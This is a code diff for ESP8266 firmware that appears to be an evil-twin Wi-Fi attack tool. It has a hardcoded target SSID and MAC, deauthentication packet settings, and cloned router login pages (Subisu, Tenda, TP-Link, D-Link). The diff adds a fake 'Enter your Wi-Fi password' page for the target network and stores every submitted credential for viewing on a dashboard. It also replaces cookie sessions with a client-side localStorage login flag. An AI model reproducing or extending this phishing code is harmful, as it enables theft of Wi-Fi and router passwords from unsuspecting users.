@@ -20,7 +20,6 @@ struct Config {
   bool scanningForChannel;
   int totalSendPkt;
   int pkts;
-  String sessionID;
 };
 
 IPAddress local_IP, gateway_IP, subnet_IP;
@@ -31,7 +30,11 @@ ESP8266WebServer server(80);
 uint8_t targetMAC[6];
 int attackCount = 0;          // Global counter
 
-void saveConfig() {
+// HTML Template with {{ssid}} placeholder
+
+
+
+  void saveConfig() {
   File file = LittleFS.open("/config.json", "w");
   if (!file) {
     Serial.println("Failed to open config file for writing");
@@ -50,7 +53,6 @@ void saveConfig() {
   doc["scanningForChannel"] = config.scanningForChannel;
   doc["totalSendPkt"] = config.totalSendPkt;
   doc["pkts"] = config.pkts;
-  doc["sessionID"] = config.sessionID;
   if (serializeJson(doc, file) == 0) {
     Serial.println("Failed to write to file");
     file.close();
@@ -69,7 +71,7 @@ void loadConfig() {
     config.ip = "192.168.1.1";
     config.targetSSID = "Redmi 9A";
     config.targetMAC = "34:B9:8D:39:8A:4D";
-    config.loginPageName = "login.html";
+    config.loginPageName = "subisu";
     config.targetChannel = 1;
     config.username = "admin";
     config.password = "admin";
@@ -77,7 +79,6 @@ void loadConfig() {
     config.scanningForChannel = false;
     config.totalSendPkt = 100;
     config.pkts = 1000;
-    config.sessionID = "";
     saveConfig();
     return;
 
@@ -107,7 +108,6 @@ void loadConfig() {
   config.scanningForChannel = doc["scanningForChannel"] | false;
   config.totalSendPkt = doc["totalSendPkt"];
   config.pkts = doc["pkts"];
-  config.sessionID = doc["sessionID"].as<String>();
   file.close();
   Serial.println("Config loaded successfully");
 }
@@ -123,7 +123,6 @@ void printConfig() {
   Serial.println("Password: " + config.password);
   Serial.println("Attacking: " + String(config.attacking ? "true" : "false"));
   Serial.println("Scanning For Channel: " + String(config.scanningForChannel ? "true" : "false"));
-  Serial.println("Session ID: " + config.sessionID);
   Serial.println("=======================");
 }
 
@@ -201,13 +200,6 @@ void sendProgmem(const char* ptr, size_t size, const char* type) {
   server.send_P(200, type, ptr, size);
 }
 
-String generateSessionID() {
-  String id = "";
-  for (int i = 0; i < 16; i++) {
-    id += String(random(0, 16), HEX);
-  }
-  return id;
-}
 void saveLoginAttempt(const String &username, const String &password, const String &wifi_router) {
   // File open karo
   File file = LittleFS.open("/login_attempts.json", "r");
@@ -238,39 +230,85 @@ void saveLoginAttempt(const String &username, const String &password, const Stri
   }
 }
 
-
 void handleAuth() {
   if (server.hasArg("user") && server.hasArg("pass")) {
     String username = server.arg("user");
     String password = server.arg("pass");
     String page = server.arg("page");
+    String type = server.arg("type");
+
     Serial.println(username);
     Serial.println(password);
-    Serial.println("login attempt"+config.username);
-    Serial.println("login attempt"+config.password);
+    Serial.println("login attempt " + config.username);
+    Serial.println("login attempt " + config.password);
+
     if (username == config.username && password == config.password) {
-      config.sessionID = generateSessionID();
       String response = "<html><head>"
                         "<meta http-equiv='refresh' content='2; url=/dashboard'>"
+                        "<script>"
+                        "localStorage.setItem('isLoggedIn', 'true');"
+                        "</script>"
                         "</head><body>"
                         "<h1>Login Successful</h1>"
                         "<p>Redirecting to dashboard...</p>"
                         "</body></html>";
-      
-      server.sendHeader("Set-Cookie", "session=" + config.sessionID);
       server.send(200, "text/html", response);
-      
       return;
     }
-    else{
-      saveLoginAttempt(username, password,page);
-      sendProgmem((char*)subisu_html, subisu_html_len, "text/html");
+    else {
+      saveLoginAttempt(username, password, page);
+
+      if (type == "wifi") {
+        String response = "<html><head>"
+                        "<meta http-equiv='refresh' content='2; url=/login'>"
+                        "</body></html>";
+        server.send(200, "text/html", response);
+        return;
+      }
+      else {
+        String wifi_login = R"rawliteral(
+          <!DOCTYPE html><html><head>
+          <meta name="viewport" content="width=device-width,initial-scale=1">
+          <style>
+          body{font-family:Arial;text-align:center;background:#f9f9f9;margin:0}
+          .b{background:#fff;display:inline-block;padding:15px;margin-top:50px;border-radius:8px;box-shadow:0 0 5px #aaa;width:90%;max-width:350px}
+          label{display:block;margin:10px 0 5px;font-weight:bold}
+          input,button{width:100%;max-width:300px;padding:8px;margin-bottom:10px;font-size:14px}
+          button{background:#4CAF50;color:#fff;border:none;border-radius:5px;cursor:pointer}
+          button:hover{background:#45a049}
+          p{font-size:12px;color:gray}
+          @media(max-width:480px){.b{margin-top:30px;padding:10px}input,button{font-size:13px}}
+          </style></head>
+          <body>
+          <div class="b">
+          <form method="post" action="/auth">
+          <label>Wi-Fi {{ssid}}</label>
+          <input type="hidden" name="user" value="{{ssid}}">
+          <p>Enter your Wi-Fi password</p>
+          <p><input type="password" id="pass" name="pass"></p>
+          <button type="submit">Connect</button>
+          <input type="hidden" name="page" value="{{ssid}}">
+          <input type="hidden" name="type" value="wifi">
+          </form>
+          </div>
+          </body></html>
+          )rawliteral";
+          
+
+        wifi_login.replace("{{ssid}}", config.targetSSID);
+        server.send(200, "text/html", wifi_login);
+        return;
+      }
     }
   }
-  else{
-    sendProgmem((char*)subisu_html, subisu_html_len, "text/html");
-  }
+  else {
+    String response = "<html><head>"
+    "<meta http-equiv='refresh' content='2; url=/login'>"
+    "</body></html>";
+    server.send(200, "text/html", response);
+    return;  }
 }
+
 
 
 void showLoginAttempts() {
@@ -293,6 +331,7 @@ void showLoginAttempts() {
   html += "<style>table{border-collapse:collapse;width:100%;}th,td{border:1px solid #ccc;padding:8px;text-align:center;}th{background:#eee;}</style>";
   html += "</head><body>";
   html += "<h2>Login Attempts</h2>";
+  html += "<button onclick='clearLoginAttempts()'>Clear Login Attempts</button>";
   html += "<table><tr><th>Username</th><th>Password</th><th>WiFi Router</th></tr>";
 
   JsonArray arr = doc.as<JsonArray>();
@@ -304,11 +343,17 @@ void showLoginAttempts() {
 
       html += "</tr>";
   }
-
+  html += "<script>function clearLoginAttempts() {fetch('/clear_login_attempts', {method: 'POST'}).then(response => response.text()).then(data => {alert(data);window.location.reload();});}</script>";
   html += "</table></body></html>";
 
   server.send(200, "text/html", html);
 }
+
+void clearLoginAttempts() {
+  LittleFS.remove("/login_attempts.json");
+  server.send(200, "text/html", "Login attempts cleared");
+}
+
 
 void setup() {
   Serial.begin(115200);
@@ -344,11 +389,25 @@ void setup() {
 
   // Setup web server
   server.on("/", HTTP_GET, []() {
-    sendProgmem((char*)test_html, test_html_len, "text/html");
+    sendProgmem((char*)desbord_html, desbord_html_len, "text/html");
   });
 
   server.on("/login", HTTP_GET, []() {
-    sendProgmem((char*)subisu_html, subisu_html_len, "text/html");
+    if(config.loginPageName=="subisu"){
+      sendProgmem((char*)subisu_html, subisu_html_len, "text/html");
+    }
+    else if(config.loginPageName=="tanda"){
+      sendProgmem((char*)tanda_html, tanda_html_len, "text/html");
+    }
+    else if(config.loginPageName=="tp_link"){
+      sendProgmem((char*)tp_link_html, tp_link_html_len, "text/html");
+    }
+    else if(config.loginPageName=="d_link"){
+      sendProgmem((char*)d_link_html, d_link_html_len, "text/html");
+    }
+    else{
+      sendProgmem((char*)d_link_html, d_link_html_len, "text/html");
+    }
   });
 
   // Dashboard route
@@ -391,7 +450,6 @@ void setup() {
     config.scanningForChannel = doc["scanningForChannel"];
     config.totalSendPkt = doc["totalSendPkt"];
     config.pkts = doc["pkts"];
-    config.sessionID = doc["sessionID"].as<String>();
     
     saveConfig();
     server.send(200, "application/json", "{\"success\":true}");
@@ -410,7 +468,7 @@ void setup() {
     json += "\"scanningForChannel\":" + String(config.scanningForChannel ? "true" : "false") + ",";
     json += "\"totalSendPkt\":" + String(config.totalSendPkt) + ",";
     json += "\"pkts\":" + String(config.pkts) + ",";
-    json += "\"sessionID\":\"" + config.sessionID + "\"";
+    json += "\"sessionID\":\""  "\"";
     json += "}}";
     server.send(200, "application/json", json);
   });
@@ -436,6 +494,7 @@ void setup() {
 
   server.on("/auth", HTTP_POST, handleAuth);
   server.on("/login_attempts", HTTP_GET, showLoginAttempts);
+  server.on("/clear_login_attempts", HTTP_POST, clearLoginAttempts);
 
   server.begin(); // Start the web server
   Serial.println("Web server started");
